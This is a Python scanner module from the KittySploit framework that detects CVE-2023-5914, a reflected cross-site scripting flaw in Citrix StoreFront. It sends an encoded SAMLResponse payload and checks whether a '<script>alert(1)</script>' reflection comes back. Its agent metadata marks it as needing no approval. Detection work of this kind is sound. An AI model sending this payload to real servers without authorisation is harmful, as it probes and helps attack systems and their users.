#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Reflected Cross-Site Scripting issue which is exploitable without authentication."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Citrix StoreFront - Cross-Site Scripting Detection',
        'description': 'Reflected Cross-Site Scripting issue which is exploitable without authentication. This vulnerability was exploitable through coercing an error message during an XML parsing procedure in the SSO flow.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'xss', 'citrix', 'storefront', 'cve2023', 'cloud', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    }],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.assetnote.io/resources/research/continuing-the-citrix-saga-cve-2023-5914-cve-2023-6184',
            'https://support.citrix.com/article/CTX583759/citrix-storefront-security-bulletin-for-cve20235914',
            'https://www.youtube.com/watch?v=t8MeUQrPqec',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-5914'],
        'cve': 'CVE-2023-5914',
    }

    def run(self):
        path = '/Citrix/teststoreAuth/SamlTest'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='SAMLResponse=q1YKdvT1CUotLsjPK05VskLhBrhHlSVVOpkkhZebJRs7ZUQahVp6ZkYVp7iUVEUaexUkewTmRhkHmkeGV%2bQk5wXm%2bwZn5yZ5BJr7GPtlJefmlKc4R%2bWluBRnBmSVl0XlWpYFpNvaKtUCAA%3d%3d')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('<script>alert(1)</script>', 'XmlException',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='Citrix StoreFront - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

